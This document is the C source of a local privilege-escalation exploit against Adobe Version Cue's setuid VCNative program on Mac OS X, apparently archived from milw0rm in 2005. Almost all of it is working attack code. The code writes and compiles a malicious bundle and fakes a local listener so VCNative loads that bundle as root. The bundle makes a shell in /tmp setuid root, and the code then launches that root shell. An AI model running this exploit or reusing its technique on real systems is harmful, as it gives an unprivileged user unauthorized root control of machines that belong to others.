/*[ Adobe Version Cue VCNative[OSX]: local root exploit. (dyld) ]
* 
* by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo) 
* 
* Adobe Version Cue's VCNative program allows un-privileged 
* local users to load arbitrary libraries("bundles") while 
* running setuid root. this is done via the "-lib" 
* command-line option. 
* 
* note: VCNative must connect to a valid host to be able 
* to get to the point where the library is loaded. this is 
* automated in this exploit by listening to an arbitrary local 
* port and using the localhost("127.0.0.1") to connect to. 
*****************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define VCNATIVE_PATH "/Applications/Adobe Version Cue/tomcat/webapps"\
"/ROOT/WEB-INF/components/com.adobe.bauhaus.nativecomm/res/VCNative"
#define VCNATIVE_PORT 7979
#define CC_PATH "/usr/bin/gcc"
#define BUNDLE_PATH "/tmp/xvcn_lib"
#define SUSH_PATH "/tmp/xvcn_sush"

void printe(char *,signed char);

int main(){
signed int sock=0,so=1;
char syscmd[4096+1];
struct stat mod;
struct sockaddr_in sa;
FILE *bundle,*sush;
/* banner. */
printf("[*] Adobe Version Cue VCNative[OSX]: local root exploit. (dy"
"ld)\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
/* see if we have what we need. */
if(access(CC_PATH,X_OK))
printe("incorrect gcc/cc path. (CC_PATH)",1);
if(stat(VCNATIVE_PATH,&mod))
printe("incorrect VCNative path. (VCNATIVE_PATH)",1);
if(!(S_ISUID&mod.st_mode))
printe("VCNative is not setuid. (VCNATIVE_PATH)",1);
/* appease VCNative's initial connection to load the library. */
sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(void *)&so,sizeof(so));
#ifdef SO_REUSEPORT
setsockopt(sock,SOL_SOCKET,SO_REUSEPORT,(void *)&so,sizeof(so));
#endif
sa.sin_family=AF_INET;
sa.sin_port=htons(VCNATIVE_PORT);
sa.sin_addr.s_addr=INADDR_ANY;
printf("[*] opening local port: %u.\n",VCNATIVE_PORT);
if(bind(sock,(struct sockaddr *)&sa,sizeof(sa))==-1)
printe("could not bind socket.",1);
listen(sock,1); 
/* make the bogus library/bundle. */
if(!(bundle=fopen(BUNDLE_PATH ".c","w")))
printe("could not write to bundle source file.",1);
fprintf(bundle,"void VCLibraryInit(){\n");
fprintf(bundle," seteuid(0);\n");
fprintf(bundle," setuid(0);\n");
fprintf(bundle," setegid(0);\n");
fprintf(bundle," setgid(0);\n");
fprintf(bundle," chown(\"" SUSH_PATH "\",0,0);\n");
fprintf(bundle," chmod(\"" SUSH_PATH "\",3145);\n");
fprintf(bundle,"}\n");
fprintf(bundle,"void VCLibraryExec(){}\n");
fprintf(bundle,"void VCLibraryExit(){}\n");
fclose(bundle);
/* make the (to-be) rootshell. */
if(!(sush=fopen(SUSH_PATH ".c","w")))
printe("could not write to sush/rootshell source file.",1);
fprintf(sush,"int main(){\n");
fprintf(sush," seteuid(0);\n");
fprintf(sush," setuid(0);\n");
fprintf(sush," setegid(0);\n");
fprintf(sush," setgid(0);\n");
fprintf(sush," execl(\"/bin/sh\",\"sh\",0);\n");
fprintf(sush,"}\n");
fclose(sush);
/* compile the bogus library/bundle. */
snprintf(syscmd,4096,"%s %s.c -bundle -o %s.bundle",CC_PATH,
BUNDLE_PATH,BUNDLE_PATH);
printf("[*] system: %s\n",syscmd);
system(syscmd);
/* compile the (to-be) rootshell. */
snprintf(syscmd,4096,"%s %s.c -o %s",CC_PATH,
SUSH_PATH,SUSH_PATH);
printf("[*] system: %s\n",syscmd);
system(syscmd);
/* run VCNative. (".bundle" is appended to the library path) */
snprintf(syscmd,4096,"\"%s\" -host 127.0.0.1 -port %u -lib %s",
VCNATIVE_PATH,VCNATIVE_PORT,BUNDLE_PATH);
printf("[*] system: %s\n",syscmd);
system(syscmd);
/* clean-up. */
unlink(BUNDLE_PATH ".c");
unlink(BUNDLE_PATH ".bundle");
unlink(SUSH_PATH ".c");
shutdown(sock,2);
close(sock);
/* check for success. */
if(stat(SUSH_PATH,&mod))
printe("sush/rootshell vanished? (SUSH_PATH)",1);
if(!(S_ISUID&mod.st_mode)||mod.st_uid){
unlink(SUSH_PATH);
printe("sush/rootshell is not setuid root, exploit failed.",1);
}
/* success. */
printf("[*] attempting to execute rootshell... (" SUSH_PATH ")\n\n");
system(SUSH_PATH);
exit(0);
}
/* all-purpose error/exit function. */
void printe(char *err,signed char e){
printf("[!] %s\n",err);
if(e)exit(e);
return;
}

// milw0rm.com [2005-08-30]
